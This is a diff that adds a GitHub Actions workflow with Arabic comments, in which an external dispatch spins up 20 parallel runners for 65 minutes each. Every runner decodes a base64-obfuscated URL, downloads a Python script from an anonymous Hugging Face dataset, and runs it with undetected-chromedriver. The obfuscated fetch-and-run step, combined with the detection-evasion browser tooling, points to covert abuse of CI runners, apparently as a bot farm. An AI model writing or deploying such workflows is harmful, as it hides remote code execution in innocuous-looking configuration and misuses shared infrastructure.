@@ -1,0 +1,108 @@
+name: Linux Remote Task Squadron
+
+on:
+  # استقبال أمر التشغيل من الخارج عبر التوكن بالكلمة المفتاحية: start
+  repository_dispatch:
+    types: [start]
+
+concurrency:
+  group: remote-squadron-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # وحدة التحكم الزمنية: تُنهي الـ workflow بأكمله عند حد 65 دقيقة
+  # =================================================================
+  time-controller:
+    name: "Time Controller"
+    runs-on: ubuntu-latest
+    timeout-minutes: 70
+    steps:
+      - name: Initiate Absolute Termination Cycle
+        run: |
+          echo "[CONTROLLER] Time controller activated. Complete shutdown scheduled at the 65-minute boundary."
+          echo "[CONTROLLER] Tracking workflow identifier: ${{ github.run_id }}"
+          
+          # الانتظار لمدة 65 دقيقة بالضبط (3900 ثانية)
+          sleep 3900
+          
+          echo "[CONTROLLER] Boundary crossed! Triggering absolute termination cycle..."
+          
+          # إصدار أمر الإلغاء الشامل عبر واجهة GitHub البرمجية
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+          
+          echo "[CONTROLLER] Termination cycle dispatched. All active and queued units will be erased."
+
+  # =================================================================
+  # المهمة الرئيسية: تهيئة وإطلاق وحدات السرب
+  # =================================================================
+  launch-squadron:
+    name: "SquadronUnit-${{ matrix.unit_index }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 65
+
+    strategy:
+      fail-fast: false
+      matrix:
+        unit_index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+    steps:
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # [الطور ١] تأسيس البنية التحتية
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Build Infrastructure Base
+        run: |
+          echo "[BUILD] Building infrastructure base for SquadronUnit-${{ matrix.unit_index }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y curl python3-pip
+
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # [الطور ٢] جلب ملف المهمة من المستودع البعيد
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Download Mission File
+        run: |
+          echo "[DOWNLOAD] Downloading app_task.py from designated host..."
+          HOST_ADDRESS=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QveGEvcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$HOST_ADDRESS" -o app_task.py
+          echo "[DOWNLOAD] Mission file downloaded to workspace."
+
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # [الطور ٣] تثبيت متطلبات التشغيل
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Deploy Runtime Components
+        run: |
+          echo "[DEPLOY] Deploying runtime components..."
+          pip3 install -q undetected-chromedriver selenium requests
+
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      # [الطور ٤] التشغيل تحت إشراف زمني (65 دقيقة)
+      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
+      - name: Execute Under Lifecycle Monitor
+        run: |
+          echo ">> Activating SquadronUnit-${{ matrix.unit_index }}..."
+          
+          # إطلاق العملية في الخلفية
+          python3 app_task.py &
+          SQUADRON_PID=$!
+          
+          echo ">> Lifecycle monitor armed. Upper limit: 65 minutes (3900s)."
+          
+          # الانتظار حتى استنفاد المدة المحددة
+          sleep 3900
+          
+          # التحقق من حالة العملية وإنهاؤها عند الضرورة
+          if kill -0 $SQUADRON_PID 2>/dev/null; then
+            echo ">> Upper limit breached! Terminating operation..."
+            kill -9 $SQUADRON_PID
+            echo ">> Operation terminated by monitor."
+          else
+            echo ">> Operation concluded before the upper limit."
+          fi
